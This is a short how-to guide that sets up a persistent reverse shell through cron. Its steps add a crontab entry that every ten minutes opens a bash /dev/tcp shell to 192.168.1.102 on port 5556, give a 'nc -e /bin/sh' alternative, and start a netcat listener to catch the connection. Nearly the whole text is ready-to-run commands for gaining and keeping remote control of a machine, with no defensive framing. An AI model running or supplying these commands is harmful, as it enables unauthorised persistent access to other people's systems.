---
legal-banner: true
---

### **Step 1: Create the Cron Job**

1. Open the crontab editor:
    `crontab -e`
2. Add the following line to create a cron job that runs every 10 minutes:
    `*/10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196`
3. Alternatively, use netcat for the reverse shell:
    `*/10 * * * * nc -e /bin/sh 192.168.1.21 5556`
4. If you need to specify a user, add the user before the command:
    `*/10 * * * * pelle /path/to/binary`

### **Step 2: Verify the Cron Job**

1. Check if the cron service is active:
    `service crond status`
2. If the cron service is not started, start it:
    `service crond start`

### **Step 3: Set Up a Netcat Listener**

1. On your local machine, set up a netcat listener to catch the reverse shell connection:
    `nc -lvp 5556`

### **Step 4: Troubleshooting and Verification**

1. Verify that the cron job is running:
    `crontab -l`
2. Check the status of the cron service again if needed:
    `service crond status`
    `pgrep cron`
4. Ensure your netcat listener is ready and waiting for connections:
    `nc -lvp 5556`